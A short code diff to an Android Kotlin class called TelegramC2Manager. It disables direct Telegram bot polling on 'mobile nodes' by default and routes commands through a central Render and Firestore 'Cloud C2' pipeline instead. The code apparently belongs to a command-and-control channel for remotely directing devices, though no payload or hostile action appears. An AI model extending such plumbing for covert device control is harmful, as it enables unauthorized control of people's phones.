@@ -87,6 +87,14 @@ class TelegramC2Manager private constructor(private val context: Context) {
             Log.w("TelegramC2", "Cloud listener init warning: ${e.message}")
         }
 
+        // To avoid HTTP 409 Conflict with the 24/7 Render Cloud Server holding the single Telegram polling stream,
+        // direct getUpdates polling is disabled by default on mobile nodes. Commands are delivered instantly via Cloud C2/Firestore.
+        if (!telegramConfig.isDirectPollingEnabled()) {
+            logEvent("☁️ Cloud C2 Active: Commands routed via central Render/Firestore pipeline (409 conflict avoided).")
+            return
+        }
+
+        logEvent("⚡ Direct Telegram Polling enabled (Standalone mode)")
         pollingJob = scope.launch {
             while (isActive) {
                 val token = telegramConfig.getBotToken()
